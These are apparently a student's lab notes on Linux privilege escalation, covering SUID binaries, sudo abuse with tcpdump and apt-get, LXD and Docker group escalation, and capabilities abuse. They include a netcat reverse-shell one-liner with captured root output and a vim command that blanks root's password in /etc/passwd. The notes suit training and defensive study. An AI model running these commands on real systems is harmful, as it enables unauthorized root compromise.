---
title: 5. Permission Based Priviledge Escalation
parent: Linux Privilege Escalation
layout: default
---

## Special Permissions

`setuid` permission can allow user to execute program with permissions of another user
```shell-session
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
```
Possible to RE the program with SETUID bit set, identify vuln, exploit to escalate priviledges

setgid permission another permission that allows us to run binaries if we were part of the group that created them. Enumerate with
`find / -uid 0 -perm -6000 -type f 2>/dev/null`.
https://linuxconfig.org/how-to-use-special-permissions-the-setuid-setgid-and-sticky-bits

`apt-get` can be used to break out of restricted environments and spawn a shell by adding Pre-Inoke command

```shell-session
sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
```

SUID bit 4000, set, owned by root, means, process runs with effective UID of file owner, not user executing it
Linux tracks:
Real UID (RUID) -> who launched process
Effective UID (EUID) -> whose privileges the process runs with
So EUID becomes root.

GID is same thing, but bit value 2000, i.e. -rwxr-sr-**x**
Any vulnerability inside SUID-root binary is root compromise
example:
`system("cp file /tmp/)`
OS searches $PATH. If we control writable directory early in PATH,
echo "/bin/bash" > cp
chmod +x cp
-> SUID bianry runs cp, it executes malicious version.
EUID = root, payload runs as root

## Sudo Rights Abuse
misconfigure who has sudo rigths to right commands. Extending sudo -l

Example, say user can run tcpdump without password.
Take advantage of the postrotate-command option,
By using -z flag, we can use tcpdump to execute a shell script, gain reverse shell as root user or run other commands
Say .test contains reverse shell
```shell-session
 sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
```

Reverse shell one line:
```shell-session
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.3 443 >/tmp/f
```
Next, start netcat listener on attacking box and run tcpdump as root with  -z command.
```shell-session
sudo /usr/sbin/tcpdump -ln -i ens192 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root

dropped privs to root
tcpdump: listening on ens192, link-type EN10MB (Ethernet), capture size 262144 bytes
Maximum file limit reached: 1
1 packet captured
6 packets received by filter
compress_savefile: execlp(/tmp/.test, /dev/null) failed: Permission denied
0 packets dropped by kernel
```
```shell-session
mariimako@htb[/htb]$ nc -lnvp 443

listening on [any] 443 ...
connect to [10.10.14.3] from (UNKNOWN) [10.129.2.12] 38938
bash: cannot set terminal process group (10797): Inappropriate ioctl for device
bash: no job control in this shell

root@NIX02:~# id && hostname               
id && hostname
uid=0(root) gid=0(root) groups=0(root)
NIX02
```
AppArmor has predefined commands used with postrotate-command, preventing command execution.

When giving sudo rights:
1. Always specify absolute path to any binaries listed in sudoers file entry. Otherwise, PATH abuse may happen to create malicious binary executed when command runs
2. Grant sudo rigths paringly, least priviledge.
## Priviledged Groups

Check what group you are in
`id`
Depending on group membership, we may escalate
### LXD
LXD: similar to Docker, container manager

Upon installation, all users are added to LXD group. Membership of this group can be used to escalate priviledges by creating LXD container, making it priviledged and then accessing host file system at /mnt/root. 

-> confirm group memberhsip
````shell-session
unzip alpine.zip 
````
`lxd init`
```shell-session
lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine
```
Start privileged container with security.privileged set to true, to run container without UID mapping, making root user in the container the same as root user on the host.
```shell-session
lxc init alpine r00t -c security.privileged=true
```
Mount host file system
```shell-session
lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true
```
Spawn shell inside container. Can browse the mounted host file system as root.
e.g. /etc/shadow
```shell-session
lxc start r00t
```
### Docker
Placing user in docker group equivalent to root level access without password. 

Members of docker group can spawn new docker containers. 
``docker run -v /root:/mnt -it ubuntu``

Creates Docker instance with /root directory on host file syste, mounted as volume.

Can be done for various directories as well

### Disk

Users within disk group have full access to any devices contained within /dev
such as /dev/sda1 which is main device used by OS.
Can use `debugfs` to access entire file system with root level privileges
### ADM
Members of adm group are able to read all logs stored in `/var/log`

## Capabilities
Security feature to allow specific privileges to be granted to processes.
Giving capabilities to not properly isolated or sandboxed can result in privilege escalation
`setcap` 

```shell-session
sudo setcap cap_net_bind_service=+ep /usr/bin/vim.basic
```

|**Capability**|**Description**|
|---|---|
|`cap_sys_admin`|Allows to perform actions with administrative privileges, such as modifying system files or changing system settings.|
|`cap_sys_chroot`|Allows to change the root directory for the current process, allowing it to access files and directories that would otherwise be inaccessible.|
|`cap_sys_ptrace`|Allows to attach to and debug other processes, potentially allowing it to gain access to sensitive information or modify the behavior of other processes.|
|`cap_sys_nice`|Allows to raise or lower the priority of processes, potentially allowing it to gain access to resources that would otherwise be restricted.|
|`cap_sys_time`|Allows to modify the system clock, potentially allowing it to manipulate timestamps or cause other processes to behave in unexpected ways.|
|`cap_sys_resource`|Allows to modify system resource limits, such as the maximum number of open file descriptors or the maximum amount of memory that can be allocated.|
|`cap_sys_module`|Allows to load and unload kernel modules, potentially allowing it to modify the operating system's behavior or gain access to sensitive information.|
|`cap_net_bind_service`|Allows to bind to network ports, potentially allowing it to gain access to sensitive information or perform unauthorized actions.|
Values to use with setcap

|**Capability Values**|**Description**|
|---|---|
|`=`|This value sets the specified capability for the executable, but does not grant any privileges. This can be useful if we want to clear a previously set capability for the executable.|
|`+ep`|This value grants the effective and permitted privileges for the specified capability to the executable. This allows the executable to perform the actions that the capability allows but does not allow it to perform any actions that are not allowed by the capability.|
|`+ei`|This value grants sufficient and inheritable privileges for the specified capability to the executable. This allows the executable to perform the actions that the capability allows and child processes spawned by the executable to inherit the capability and perform the same actions.|
|`+p`|This value grants the permitted privileges for the specified capability to the executable. This allows the executable to perform the actions that the capability allows but does not allow it to perform any actions that are not allowed by the capability. This can be useful if we want to grant the capability to the executable but prevent it from inheriting the capability or allowing child processes to inherit it.|

Caps to use to escalate

|**Capability**|**Description**|
|---|---|
|`cap_setuid`|Allows a process to set its effective user ID, which can be used to gain the privileges of another user, including the `root` user.|
|`cap_setgid`|Allows to set its effective group ID, which can be used to gain the privileges of another group, including the `root` group.|
|`cap_sys_admin`|This capability provides a broad range of administrative privileges, including the ability to perform many actions reserved for the `root` user, such as modifying system settings and mounting and unmounting file systems.|
|`cap_dac_override`|Allows bypassing of file read, write, and execute permission checks.|

### Enumerating Capabilities
```shell-session
find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
```
Search all binary executables in directory and use -exec to run getcap command on each.

### Exploitation
i.e. we discove `cap_dac_override` capablity for `vim.basic`

This cap will allow to bypass permissions
We can use this to modify a system file, or make changes in non interactive mode
```shell-session
echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd
cat /etc/passwd | head -n1

root::0:0:root:/root:/bin/bash
```

Reading a file:
```
echo -e ':r /root/flag.txt\n:w! /dev/stdout\n:q!' | /usr/bin/vim.basic -es
```
